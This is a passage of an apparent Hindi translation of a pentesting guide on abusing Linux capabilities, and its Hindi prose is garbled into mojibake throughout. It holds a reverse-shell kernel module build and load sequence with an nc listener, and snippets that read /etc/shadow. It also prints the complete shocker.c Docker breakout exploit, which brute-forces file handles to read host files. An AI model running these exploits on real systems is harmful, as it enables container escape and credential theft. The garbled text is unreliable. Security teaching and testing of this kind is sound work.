{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile ‡§Æ‡•á‡§Ç ‡§π‡§∞ ‡§∂‡§¨‡•ç‡§¶ ‡§ï‡•á ‡§™‡§π‡§≤‡•á ‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ö‡§∞‡§ø‡§§‡•ç‡§∞ **‡§ü‡•à‡§¨ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§® ‡§ï‡§ø ‡§∏‡•ç‡§™‡•á‡§∏‡•á‡§∏**!
{% endhint %}

‡§á‡§∏‡•á ‡§ï‡§Ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è `make` ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, ‡§è‡§ï ‡§∂‡•à‡§≤ ‡§Æ‡•á‡§Ç `nc` ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§∂‡•à‡§≤ ‡§∏‡•á **‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§≤‡•ã‡§°** ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§Ü‡§™ nc ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•á‡§Ç ‡§∂‡•à‡§≤ ‡§ï‡•ã ‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§ï‡•ã‡§° "Abusing SYS\_MODULE Capability" ‡§ï‡•á ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡§∂‡§æ‡§≤‡§æ ‡§∏‡•á ‡§ï‡•â‡§™‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã **‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§¢‡§º‡§®‡•á, ‡§î‡§∞ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§™‡§¢‡§º‡§®‡•á ‡§î‡§∞ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§™‡§¢‡§º‡§®‡•á ‡§î‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø** ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨‡§ï‡§ø ‡§á‡§∏‡•á ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§®‡•á ‡§Ø‡§æ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§°‡§ø‡§ú‡§º‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§Ø‡§π ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã `open_by_handle_at(2)` ‡§ï‡•ã ‡§Ü‡§π‡•ç‡§µ‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§≠‡•Ä ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§™‡§æ‡§∏ `CAP_DAC_READ_SEARCH` ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•ã‡§®‡•á ‡§™‡§∞ ‡§µ‡§π `open_by_handle_at(2)` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à, ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§â‡§®‡§ï‡•á ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•á ‡§¨‡§æ‡§π‡§∞ ‡§ï‡•Ä ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§≠‡•Ä‡•§ `open_by_handle_at(2)` ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∞‡§ø‡§§ ‡§π‡•à‡§Ç‡§°‡§≤ ‡§ï‡•ã `name_to_handle_at(2)` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Ø‡§π ‡§π‡•à‡§Ç‡§°‡§≤ ‡§ó‡•ã‡§™‡§®‡•Ä‡§Ø ‡§î‡§∞ ‡§õ‡•á‡§°‡§º‡§õ‡§æ‡§°‡§º ‡§ï‡•á ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä, ‡§ú‡•à‡§∏‡•á ‡§á‡§®‡•ã‡§° ‡§®‡§Ç‡§¨‡§∞, ‡§ï‡•ã ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π Docker ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§™‡§π‡§≤‡•á Sebastian Krahmer ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ‡§Ö‡§™‡§∂‡§¨‡•ç‡§¶ ‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§è‡§ï ‡§Æ‡•Å‡§¶‡•ç‡§¶‡§æ ‡§∏‡§æ‡§¨‡§ø‡§§ ‡§π‡•Å‡§Ü‡•§\
**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ú‡§æ‡§Ç‡§ö ‡§î‡§∞ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§™‡§¢‡§º‡§®‡•á / ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º‡§ï‡§∞ ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§™‡§¢‡§º ‡§∏‡§ï‡•á‡§ó‡§æ‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§ú‡•à‡§∏‡•á tar ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§§‡•ã ‡§Ø‡§π shadow ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§™‡§¢‡§º ‡§∏‡§ï‡•á‡§ó‡§æ:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä 2 ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§® ‡§≤‡•á‡§Ç ‡§ï‡§ø **`python`** ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à‡•§ ‡§∞‡•Ç‡§ü ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§Ø‡§π ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
‡§î‡§∞ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
print(open("/etc/shadow", "r").read())
```
**‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (Docker ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü)**

‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
‡§™‡§ø‡§õ‡§≤‡•á ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **DAC\_READ\_SEARCH** ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§™‡§∞‡§ø‡§£‡§æ‡§Æ‡§∏‡•ç‡§µ‡§∞‡•Ç‡§™, ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ **‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§°‡•Ä‡§¨‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§

‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Ç ‡§ú‡§æ‡§® ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§§‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à: [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§Ç‡§ï‡•ç‡§∑‡•á‡§™ ‡§Æ‡•á‡§Ç ‡§ï‡§π‡•á‡§Ç ‡§§‡•ã **CAP\_DAC\_READ\_SEARCH** ‡§π‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ ‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§§‡§æ ‡§π‡•Ä ‡§π‡•à, ‡§¨‡§≤‡•ç‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á _**open\_by\_handle\_at(2)**_ ‡§î‡§∞ **‡§π‡§Æ‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ñ‡•ã‡§≤‡•Ä ‡§ó‡§à ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§

‡§Æ‡•Ç‡§≤ ‡§â‡§§‡•ç‡§™‡§æ‡§¶‡§® ‡§ú‡•ã ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§π‡•ã‡§∏‡•ç‡§ü ‡§∏‡•á ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π‡§æ‡§Ç ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§è‡§ï **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§™‡§¢‡§º‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§™‡§π‡§≤‡•á ‡§§‡§∞‡•ç‡§ï ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§á‡§∏‡•á ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à**‡•§
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
‡§Æ‡•Å‡§ù‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§ö‡•Ä‡§ú‡§º ‡§ï‡•á ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§¢‡•Ç‡§Ç‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•ã‡•§ ‡§Æ‡•Ç‡§≤ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§Æ‡•á‡§Ç ‡§´‡§º‡§æ‡§á‡§≤ /.dockerinit ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§î‡§∞ ‡§á‡§∏ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Æ‡•á‡§Ç /etc/hostname ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§§‡•ã ‡§∂‡§æ‡§Ø‡§¶ ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡•Ä ‡§ó‡§à ‡§´‡§º‡§æ‡§á‡§≤ ‡§¢‡•Ç‡§Ç‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§∏ ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§è‡§Ç:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§ï‡•ã‡§° "Abusing DAC\_READ\_SEARCH Capability" ‡§ï‡•á ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡§∂‡§æ‡§≤‡§æ ‡§∏‡•á ‡§ï‡•â‡§™‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) **‡§∏‡•ç‡§™‡•á‡§®** ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§á‡§µ‡•á‡§Ç‡§ü ‡§π‡•à ‡§î‡§∞ ‡§Ø‡•Ç‡§∞‡•ã‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§π‡•à‡•§ **‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§ú‡•ç‡§û‡§æ‡§® ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡•á** ‡§ï‡•Ä ‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§Ø‡§π ‡§ï‡§æ‡§Ç‡§ó‡•ç‡§∞‡•á‡§∏ ‡§™‡•ç‡§∞‡•å‡§¶‡•ç‡§Ø‡•ã‡§ó‡§ø‡§ï‡•Ä ‡§î‡§∞ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡§∞ ‡§µ‡§ø‡§∑‡§Ø ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§â‡§¨‡§≤‡§§‡§æ ‡§π‡•Å‡§Ü ‡§Æ‡§ø‡§≤‡§®‡•á ‡§ï‡§æ ‡§∏‡§Æ‡§Ø ‡§π‡•à‡•§

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

